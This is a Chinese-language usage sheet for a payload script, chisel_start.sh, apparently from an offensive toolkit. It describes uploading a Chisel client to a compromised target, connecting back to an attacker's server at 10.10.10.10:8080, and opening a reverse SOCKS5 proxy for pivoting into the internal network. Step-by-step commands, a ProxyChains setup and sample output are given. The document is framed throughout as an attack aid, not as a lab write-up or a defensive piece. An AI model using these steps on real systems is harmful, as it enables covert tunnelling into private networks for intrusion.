## 📦 载荷使用说明：chisel_start.sh

### 📝 功能说明
基于 HTTP 传输的快速 TCP/UDP 隧道工具。此脚本用于在目标机器上启动 Chisel 客户端，反向连接到攻击者的 Chisel 服务端，建立内网穿透隧道。

### ⚙️ 参数说明
```text
- `server_ip`：攻击者（服务端）的 IP 地址
- `server_port`：攻击者监听的端口（默认 8080）
- `R:socks`：开启反向 SOCKS5 代理，允许攻击者通过隧道访问内网
```

### 🚀 操作步骤
1. 在攻击机启动 Chisel 服务端：`chisel server -p 8080 --reverse`。
2. 将此脚本及 Chisel 客户端二进制文件上传至目标主机。
3. 修改脚本中的 `server_ip` 和 `server_port`。
4. 执行脚本：`bash chisel_start.sh`。
5. 在攻击机配置 ProxyChains 使用建立的 SOCKS5 代理。

### 💻 执行样例
```bash
# 连接到攻击机 10.10.10.10 的 8080 端口并建立反向 SOCKS 代理
./chisel_start.sh 10.10.10.10 8080 R:socks

# 预期输出：
# 2023/10/24 12:00:00 client: Connecting to ws://10.10.10.10:8080
# 2023/10/24 12:00:01 client: Connected (Latency 50ms)
```
